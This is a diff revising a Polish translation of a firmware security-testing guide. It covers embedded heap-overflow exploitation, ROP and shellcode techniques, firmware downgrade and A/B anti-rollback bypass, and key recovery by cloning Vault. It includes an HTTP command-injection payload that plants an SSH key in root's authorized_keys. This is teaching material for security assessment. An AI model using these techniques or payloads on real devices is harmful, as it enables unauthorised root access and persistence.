+2. Późniejsze fragmenty sprawdzają wyłącznie kontrolowane przez atakującego pola **packet-local**, takie jak `packet_total_size >= offset + chunk_len`.
+3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzania względem **oryginalnego rozmiaru zaalokowanej pamięci**.
 
 Pozwala to atakującemu wysłać:
 
-- Pierwszy prawidłowy fragment z **małym** zadeklarowanym całkowitym rozmiarem, aby wymusić małą alokację na heapie.
+- Pierwszy poprawny fragment z **małym** zadeklarowanym total size, aby wymusić małą alokację na heapie.
 - Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
-- Sfałszowany rozmiar lokalny dla pakietu, który spełnia nowe kontrole, jednocześnie przepełniając pierwotnie zaalokowany bufor.
+- Sfałszowany packet-local size, który spełnia świeżo wykonywane checks, a mimo to przepełnia pierwotnie zaalokowany buffer.
 
-Gdy podatna ścieżka znajduje się za logiką commissioning, exploitacja musi obejmować wystarczającą **emulację urządzenia**, aby doprowadzić cel do oczekiwanego stanu pobierania modelu lub bloba przed wysłaniem zniekształconych fragmentów.
+Gdy podatna ścieżka znajduje się za logiką commissioning, exploitation musi obejmować wystarczający poziom **device emulation**, aby przeprowadzić cel do oczekiwanego stanu model-download lub blob-download przed wysłaniem zniekształconych fragmentów.
 
-### Wyzwalacze `free()` sterowane protokołem
+### Wywoływanie `free()` przez protokół
 
-W embedded daemonach najłatwiejszym sposobem wywołania heap metadata exploitation często nie jest „czekanie na cleanup”, lecz **wymuszenie obsługi błędów przez sam protokół**:<sup>[[8]](#references)</sup>
+W embedded daemonach najłatwiejszym sposobem wywołania heap metadata exploitation często nie jest „czekanie na cleanup”, lecz **wymuszenie własnej obsługi błędów przez protokół**:<sup>[[8]](#references)</sup>
 
-- Wyślij zniekształcone kolejne fragmenty, aby przesunąć FSM do stanów **retry** lub **error**.
-- Przekrocz próg ponowień, aby daemon **zresetował kontekst** i zwolnił uszkodzony bufor.
-- Użyj tego przewidywalnego `free()`, aby wywołać primitives po stronie allokatora, zanim proces zakończy się z niepowiązanych przyczyn.
+- Wyślij zniekształcone follow-up fragments, aby przeprowadzić FSM do stanów **retry** lub **error**.
+- Przekrocz retry threshold, aby daemon **zresetował context** i zwolnił uszkodzony buffer.
+- Wykorzystaj to przewidywalne `free()`, aby uruchomić primitives po stronie allocatora, zanim proces ulegnie awarii z niezwiązanych przyczyn.
 
-Jest to szczególnie przydatne przeciwko allokatorom **musl/uClibc/dlmalloc-like** w embedded Linux, gdzie uszkodzenie chunk metadata może zamienić logikę unlink/unbin w write primitive. Stabilny schemat polega na uszkodzeniu **pola size**, aby przekierować przechodzenie allokatora do **fałszywych chunków umieszczonych wewnątrz przepełnionego bufora**, zamiast natychmiastowego nadpisania rzeczywistych wskaźników bin i spowodowania crashu procesu.
+Jest to szczególnie przydatne przeciwko allocatorom typu **musl/uClibc/dlmalloc** w embedded Linux, gdzie uszkodzenie chunk metadata może zmienić logikę unlink/unbin w write primitive. Stabilny wzorzec polega na uszkodzeniu **size field**, aby przekierować przechodzenie allocatora do **fake chunks umieszczonych wewnątrz przepełnionego buffera**, zamiast natychmiastowego nadpisywania rzeczywistych bin pointers i powodowania awarii procesu.
 
-## Binary Exploitation i Proof-of-Concept
+## Binary Exploitation and Proof-of-Concept
 
-Tworzenie PoC dla zidentyfikowanych podatności wymaga głębokiego zrozumienia architektury celu oraz programowania w językach niskiego poziomu. Ochrony runtime binary są w systemach embedded rzadkie, ale gdy występują, konieczne może być zastosowanie technik takich jak Return Oriented Programming (ROP).
+Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu oraz programowania w językach niskiego poziomu. Binary runtime protections w embedded systems są rzadkie, ale gdy występują, konieczne może być zastosowanie technik takich jak Return Oriented Programming (ROP).
 
-### Uwagi dotyczące fastbin exploitation w uClibc (embedded Linux)
+### Uwagi dotyczące uClibc fastbin exploitation (embedded Linux)
 
-- **Fastbins + consolidation:** uClibc używa fastbins podobnych do glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fake chunk musi przejść kontrole (prawidłowy size, `fd = 0` oraz sąsiednie chunki uznane za „w użyciu”).<sup>[[6]](#references)</sup>
-- **Binarne pliki non-PIE z ASLR:** jeśli ASLR jest włączone, ale główny binary jest **non-PIE**, adresy `.data/.bss` wewnątrz binary są stabilne. Można wskazać obszar, który już przypomina prawidłowy nagłówek chunka heap, aby skierować alokację fastbin na **tablicę wskaźników do funkcji**.
-- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` może zatrzymać parsowanie, zachowując końcowe bajty kontrolowane przez atakującego na potrzeby stack pivot/łańcucha ROP.
-- **Shellcode przez `/proc/self/mem`:** łańcuch ROP, który wywołuje `open("/proc/self/mem")`, `lseek()` i `write()`, może umieścić wykonywalny shellcode w znanym mappingu i przekazać do niego wykonanie.
+- **Fastbins + consolidation:** uClibc używa fastbins podobnych do glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fake chunk musi przejść checks (sane size, `fd = 0` oraz sąsiednie chunki rozpoznane jako „in use”).<sup>[[6]](#references)</sup>
+- **Non-PIE binaries under ASLR:** jeśli ASLR jest włączony, ale główny binary jest **non-PIE**, adresy `.data/.bss` wewnątrz binary są stabilne. Możesz wskazać region, który już przypomina prawidłowy heap chunk header, aby skierować fastbin allocation do **function pointer table**.
+- **Parser-stopping NUL:** podczas parsowania JSON `\x00` w payloadzie może zatrzymać parsing, zachowując końcowe bajty kontrolowane przez atakującego na potrzeby stack pivot/ROP chain.
+- **Shellcode via `/proc/self/mem`:** ROP chain wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mappingu i przejść do niego.
 
 ## Przygotowane systemy operacyjne do analizy firmware
 
-Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają wstępnie skonfigurowane środowiska do testów bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.
+Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają prekonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.
 
-## Przygotowane systemy OS do analizy firmware
+## Przygotowane OS do analizy Firmware
 
-- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, zapewniając wstępnie skonfigurowane środowisko ze wszystkimi załadowanymi niezbędnymi narzędziami.
-- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do embedded security testing oparty na Ubuntu 18.04, zawierający wstępnie załadowane narzędzia do testowania bezpieczeństwa firmware.
+- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to distro przeznaczone do przeprowadzania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, zapewniając prekonfigurowane środowisko ze wszystkimi załadowanymi niezbędnymi narzędziami.
+- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do embedded security testing oparty na Ubuntu 18.04, zawierający preinstalowane narzędzia do testowania bezpieczeństwa firmware.
 
-## Ataki Firmware Downgrade i niebezpieczne mechanizmy aktualizacji
+## Firmware Downgrade Attacks & Insecure Update Mechanisms
 
-Nawet gdy vendor implementuje kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed version rollback (downgrade) jest często pomijana**. Gdy boot- lub recovery-loader weryfikuje jedynie podpis za pomocą osadzonego klucza publicznego, ale nie porównuje *wersji* (ani monotonicznego licznika) obrazu zapisywanego w urządzeniu, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma prawidłowy podpis**, ponownie wprowadzając załatane podatności.<sup>[[4]](#references)</sup>
+Nawet gdy vendor implementuje cryptographic signature checks dla obrazów firmware, **version rollback (downgrade) protection jest często pomijane**. Gdy boot- lub recovery-loader weryfikuje wyłącznie podpis za pomocą osadzonego public key, ale nie porównuje *version* (ani monotonic counter) obrazu, który ma zostać wgrany, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma prawidłowy podpis**, ponownie wprowadzając załatane podatności.<sup>[[4]](#references)</sup>
 
 Typowy workflow ataku:
 
-1. **Zdobądź starszy podpisany obraz**
-* Pobierz go z publicznego portalu pobierania vendora, CDN lub witryny wsparcia.
-* Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. z `assets/firmware/` wewnątrz Android APK).
-* Pozyskaj go z repozytoriów zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itp.
-2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** za pośrednictwem dowolnego dostępnego kanału aktualizacji:
-* Web UI, API aplikacji mobilnej, USB, TFTP, MQTT itp.
-* Wiele konsumenckich urządzeń IoT udostępnia *nieuwierzytelnione* endpointy HTTP(S), które akceptują obrazy firmware zakodowane w Base64, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
-3. Po downgrade wykorzystaj podatność, która została załatana w nowszym wydaniu (na przykład filtr command injection dodany później).
-4. Opcjonalnie wgraj z powrotem najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.
+1. **Uzyskaj starszy podpisany obraz**
+* Pobierz go z publicznego portalu pobierania vendora, CDN lub strony pomocy technicznej.
+* Wyodrębnij go z aplikacji towarzyszących na urządzenia mobilne/desktopowe (np. z `assets/firmware/` wewnątrz Android APK).
+* Pobierz go z repozytoriów zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itd.
+2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** przez dowolny wystawiony update channel:
+* Web UI, mobile-app API, USB, TFTP, MQTT itd.
+* Wiele konsumenckich urządzeń IoT udostępnia *nieuwierzytelnione* endpointy HTTP(S), które przyjmują firmware blobs zakodowane w Base64, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
+3. Po downgrade wykorzystaj podatność, która została załatana w nowszym wydaniu (na przykład filtr command-injection dodany później).
+4. Opcjonalnie wgraj ponownie najnowszy obraz lub wyłącz updates, aby uniknąć wykrycia po uzyskaniu persistence.
 
-### Przykład: Command Injection po Downgrade
+### Przykład: Command Injection After Downgrade
 ```http
 POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
 Host: 192.168.0.1
 Content-Type: application/octet-stream
 Content-Length: 0
 ```
-W podatnym (obniżonym do starszej wersji) firmware parametr `md5` jest bezpośrednio łączony z poleceniem shell bez sanityzacji, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu root za pomocą klucza SSH). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, jednak brak ochrony przed downgrade'em sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>
+W podatnym (zdegradowanym) firmware parametr `md5` jest bezpośrednio łączony z poleceniem powłoki bez sanityzacji, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu root za pomocą klucza SSH). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, ale brak ochrony przed downgrade'em sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>
 
-### Wyodrębnianie firmware z aplikacji mobilnych
+### Ekstrakcja Firmware z aplikacji mobilnych
 
-Wielu dostawców dołącza pełne obrazy firmware do swoich towarzyszących aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w APK/APEX w postaci niezaszyfrowanej, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykłe `unzip` pozwalają pobrać podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>
+Wielu dostawców dołącza pełne obrazy firmware do swoich towarzyszących aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w APK/APEX bez szyfrowania, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykły `unzip` pozwalają wyodrębnić podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>
 ```
 $ apktool d vendor-app.apk -o vendor-app
 $ ls vendor-app/assets/firmware
 firmware_v1.3.11.490_signed.bin
 ```
-### Bypass zabezpieczenia anti-rollback działającego wyłącznie w updaterze w projektach z układem slotów A/B
+### Bypass anti-rollback działający wyłącznie w updaterze w projektach z układem A/B slotów
 
-Niektórzy vendorzy implementują **ratchet** zapobiegający downgrade’om, ale wyłącznie w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery lub agencie OTA działającym w userspace). Jeśli **bootloader** sprawdza później tylko sygnaturę/CRC obrazu i ufa tablicy partycji lub metadanym slotu, zabezpieczenie przed rollbackiem nadal może zostać ominięte.<sup>[[7]](#references)</sup>
+Niektórzy vendorzy implementują **ratchet** zapobiegający downgrade'om, ale wyłącznie w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery albo agencie OTA działającym w userspace). Jeśli **bootloader** sprawdza później wyłącznie sygnaturę/CRC obrazu i ufa tablicy partycji lub metadanym slotu, ochrona przed rollbackiem nadal może zostać obejścia.<sup>[[7]](#references)</sup>
 
 Typowy słaby projekt:
 
 - Metadane firmware zawierają zarówno deskryptor wersji, jak i **security ratchet** / monotoniczny licznik.
 - Updater porównuje ratchet obrazu z wartością przechowywaną w pamięci trwałej i odrzuca starsze podpisane obrazy.
-- Bootloader **nie parsuje** tego ratchet i przed uruchomieniem wybranego slotu weryfikuje wyłącznie nagłówek, CRC i sygnaturę.
-- Aktywacja slotu jest przechowywana oddzielnie, w tablicy partycji lub w liczniku generacji konkretnego slotu, i **nie jest kryptograficznie powiązana** z dokładnym digestem firmware, który został zweryfikowany.
+- Bootloader nie parsuje tego ratchet i jedynie weryfikuje nagłówek, CRC oraz sygnaturę przed uruchomieniem wybranego slotu.
+- Aktywacja slotu jest zapisywana osobno w tablicy partycji lub w liczniku generacji przypisanym do slotu i nie jest kryptograficznie powiązana z dokładnym digestem firmware, który został zweryfikowany.
 
-Tworzy to w systemach z dwoma slotami prymityw **validate-one-image / boot-another-image**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel bootowania, używając aktualnego podpisanego obrazu, a następnie nadpisać slot B przed rebootem, bootloader może nadal uruchomić starszy obraz, ponieważ ufa wyłącznie wcześniej zapisanym metadanym slotu.
+Tworzy to w systemach z dwoma slotami prymityw **validate-one-image / boot-another-image**. Jeśli attacker może sprawić, że updater oznaczy slot B jako następny cel bootowania przy użyciu aktualnego podpisanego obrazu, a następnie nadpisać slot B przed rebootem, bootloader może nadal uruchomić downgraded image, ponieważ ufa wyłącznie wcześniej zapisanym metadanym slotu.
 
 Typowy schemat nadużycia:
 
-1. Wgraj **aktualny podpisany** firmware do pasywnego slotu i uruchom standardową procedurę walidacji/przełączania, aby layout oznaczył ten slot jako następny aktywny.
-2. **Nie wykonuj jeszcze rebootu**. W tej samej sesji ponownie wejdź do procedury przygotowania/wymazywania slotu.
+1. Wgraj **aktualny podpisany** firmware do pasywnego slotu i uruchom normalną procedurę walidacji/przełączania, aby layout oznaczył ten slot jako następny aktywny.
+2. **Nie wykonuj jeszcze rebootu**. W tej samej sesji ponownie wywołaj procedurę przygotowania/wymazywania slotu.
 3. Wykorzystaj nieaktualny stan bootowania lub nieaktualną logikę wyboru slotu, aby updater wymazał **ten sam fizyczny slot**, który właśnie został promowany.
 4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
-5. Pomiń procedurę walidacji, która wymusza ratchet, i wykonaj bezpośredni reboot.
+5. Pomiń procedurę walidacji wymuszającą ratchet i wykonaj bezpośredni reboot.
 6. Bootloader wybierze promowany slot, zweryfikuje wyłącznie sygnaturę/integralność i uruchomi stary obraz.
 
-Rzeczy, których należy szukać podczas reverse engineeringu implementacji aktualizacji A/B:
+Podczas reverse engineeringu implementacji aktualizacji A/B zwróć uwagę na:
 
 - Wybór slotu wyprowadzany z **flag ustawianych podczas bootowania**, które nie są odświeżane po pomyślnym przełączeniu.
-- Procedura w stylu `prepare_passive_slot()`, która wymazuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zatwierdzonego layoutu**.
-- Funkcja w stylu `part_write_layout()`, która tylko zwiększa **licznik generacji** / flagę aktywności i nie zapisuje hasha zweryfikowanego obrazu.
-- Sprawdzanie ratchet zaimplementowane w userspace lub kodzie updatera, ale **nieobecne** w ROM-ie / bootloaderze / etapach secure boot.
-- Procedury wymazywania lub recovery, które pozostawiają slot oznaczony jako bootowalny nawet po usunięciu i ponownym zapisaniu jego zawartości.
+- Procedurę w stylu `prepare_passive_slot()`, która wymazuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zapisanego layoutu**.
+- Funkcję w stylu `part_write_layout()`, która jedynie zwiększa **licznik generacji** / flagę aktywności i nie zapisuje hasha zweryfikowanego obrazu.
+- Sprawdzanie ratchet zaimplementowane w userspace lub kodzie updatera, ale **nie w ROM-ie / bootloaderze / etapach secure boot**.
+- Procedury wymazywania lub recovery, które pozostawiają slot oznaczony jako możliwy do bootowania, nawet po usunięciu i ponownym zapisaniu jego zawartości.
 
 ### Lista kontrolna oceny logiki aktualizacji
 
-* Czy transport/uwierzytelnianie *endpointu aktualizacji* jest odpowiednio chronione (TLS + authentication)?
+* Czy transport uwierzytelniania *update endpoint* jest odpowiednio chroniony (TLS + authentication)?
 * Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
 * Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. sygnatury są sprawdzane przez kod ROM)?
 * Czy **bootloader wymusza ten sam ratchet** co updater, zamiast sprawdzać wyłącznie sygnaturę/CRC?
-* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware**, czy slot można zmodyfikować po jego promocji?
-* Czy po pomyślnym przełączeniu slotu urządzenie jest zmuszane do rebootu, czy późniejsze procedury aktualizacji/wymazywania są nadal dostępne w tej samej sesji?
-* Czy kod userland wykonuje dodatkowe sanity checks (np. dozwolona mapa partycji, numer modelu)?
-* Czy przepływy aktualizacji *częściowych* lub *backupowych* ponownie wykorzystują tę samą logikę walidacji?
+* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware**, czy slot może zostać zmodyfikowany po promocji?
+* Po pomyślnym przełączeniu slotu urządzenie jest zmuszane do rebootu, czy późniejsze procedury aktualizacji/wymazywania są nadal dostępne w tej samej sesji?
+* Czy kod userland wykonuje dodatkowe kontrole poprawności (np. dozwolona mapa partycji, numer modelu)?
+* Czy przepływy aktualizacji typu *partial* lub *backup* ponownie wykorzystują tę samą logikę walidacji?
 
-> 💡  Jeśli któregokolwiek z powyższych elementów brakuje, platforma prawdopodobnie jest podatna na ataki rollback.
+> 💡  Jeśli któregoś z powyższych elementów brakuje, platforma prawdopodobnie jest podatna na ataki rollback.
 
 ## Podatny firmware do ćwiczeń
 
-Aby ćwiczyć wykrywanie podatności w firmware, użyj poniższych projektów podatnego firmware jako punktu wyjścia.
+Aby ćwiczyć wykrywanie podatności w firmware, wykorzystaj poniższe projekty podatnego firmware jako punkt wyjścia.
 
 - OWASP IoTGoat
 - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
@@ -484,17 +489,17 @@ Aby ćwiczyć wykrywanie podatności w firmware, użyj poniższych projektów po
 Gdy obraz aktualizacji łączy niewielką ilość metadanych w plaintext z dużym blobem o wysokiej entropii, przed rozpoczęciem brute-force wykonaj triage kontenera:<sup>[[1]](#references)</sup>
 
 - Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` oraz `binwalk -E`.
-- `Salted__` zazwyczaj oznacza format OpenSSL `enc`: kolejne 8 bajtów to salt, a pozostałe bajty to ciphertext.
-- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, jest silną wskazówką, że analizujesz ciphertext RSA-2048 opakowujący losowe hasło/klucz sesyjny firmware.
+- `Salted__` zwykle oznacza format OpenSSL `enc`: kolejne 8 bajtów to salt, a pozostałe bajty to ciphertext.
+- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, jest silną wskazówką, że masz do czynienia z ciphertextem RSA-2048 opakowującym losowe hasło firmware/klucz sesji.
 - Odłączony materiał PGP w tym samym pliku często zapewnia wyłącznie autentyczność; nie zakładaj, że jest mechanizmem zapewniającym poufność.
 
-Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, wykonaj reverse engineering **operacyjnej ścieżki deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:
+Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, odtwórz **operacyjną ścieżkę deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:
 
-- Zdekompiluj binarkę updatera / zarządzającą i prześledź, kto odczytuje zaszyfrowany blob, który helper/API go rozwija oraz jakiej logicznej nazwy klucza żąda.
-- Przeszukaj wyodrębniony root filesystem pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), a także unit files i skryptów init.
-- Traktuj jawne polecenia `vault operator unseal ...`, klucze recovery, tokeny bootstrap lub lokalne skrypty automatycznego odpieczętowywania KMS jako odpowiedniki materiału klucza prywatnego.
+- Zdekompiluj updater / binarkę zarządzającą i prześledź, kto odczytuje zaszyfrowany blob, który helper/API go rozwija oraz jakiej logicznej nazwy klucza żąda.
+- Przeszukaj wyodrębniony root filesystem pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), a także plików unit i skryptów init.
+- Traktuj jawne polecenia `vault operator unseal ...`, klucze recovery, tokeny bootstrap lub lokalne skrypty auto-unseal KMS jako odpowiedniki materiału klucza prywatnego.
 
-Jeśli urządzenie zawiera oryginalną binarkę Vault i backend storage, odtworzenie tego środowiska jest zazwyczaj łatwiejsze niż ponowne implementowanie mechanizmów wewnętrznych Vault:
+Jeśli appliance zawiera oryginalną binarkę Vault i backend storage, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja mechanizmów wewnętrznych Vault:
 ```bash
 vault server -config=/tmp/vault.hcl
 vault operator unseal <share1>
@@ -509,14 +514,14 @@ vault operator generate-root -nonce="$NONCE" "<share2>"
 FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
 TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
 ```
-Z uprawnieniami root na sklonowanym KMS:
+Z uprawnieniami root w sklonowanym KMS:
 
-- Ustaw klucze transit jako eksportowalne wyłącznie w odizolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
+- Spraw, aby klucze tranzytowe były eksportowalne wyłącznie wewnątrz izolowanego klona: `vault write transit/keys/<name>/config exportable=true`
 - Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
-- Wypróbuj odzyskany klucz RSA z dokładną parą padding/hash używaną przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
-- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez dostawcę (`EVP_BytesToKey`, często MD5 w starszych appliances) przed próbą odszyfrowania AES-CBC.
+- Przetestuj odzyskany klucz RSA z dokładną parą padding/hash używaną przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
+- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez vendora (`EVP_BytesToKey`, często MD5 w starszych appliance'ach), zanim spróbujesz odszyfrowania AES-CBC.
 
-Zmienia to problem „zaszyfrowanego firmware” w bardziej ogólny problem: **odzyskaj klucze operacyjne po stronie appliance, a następnie offline odtwórz dokładne parametry unwrap + KDF**.
+Zmienia to problem „zaszyfrowanego firmware'u” w bardziej ogólny problem: **odzyskaj klucze operacyjne po stronie appliance'a, a następnie odtwórz offline dokładne parametry unwrap + KDF**.
 
 ## Szkolenia i certyfikaty
 
@@ -524,12 +529,12 @@ Zmienia to problem „zaszyfrowanego firmware” w bardziej ogólny problem: **o
 
 ## References
 
-- [1] [Łamanie firmware za pomocą Claude: umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
-- [2] [Metodyka testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
-- [3] [Praktyczny hacking IoT: Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
-- [4] [Wykorzystywanie zero-dayów w porzuconym hardware – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
-- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do Twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
-- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
-- [7] [Synacktiv - Wykorzystywanie Tesla Wall Connector przez jego złącze portu ładowania - część 2: omijanie mechanizmu anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
-- [8] [Make it Blink: wykorzystywanie Philips Hue Bridge drogą Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
+- [1] [Cracking Firmware with Claude: Umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
+- [2] [Metodyka testowania bezpieczeństwa firmware'u](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
+- [3] [Praktyczny hacking IoT: Kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
+- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
+- [6] [Teraz widzisz mi: teraz jesteś Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
+- [7] [Synacktiv - Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania - część 2: omijanie ochrony przed downgrade'em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
+- [8] [Make it Blink: Eksploatacja mostka Philips Hue przez OTA](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
 {{#include ../../banners/hacktricks-training.md}}
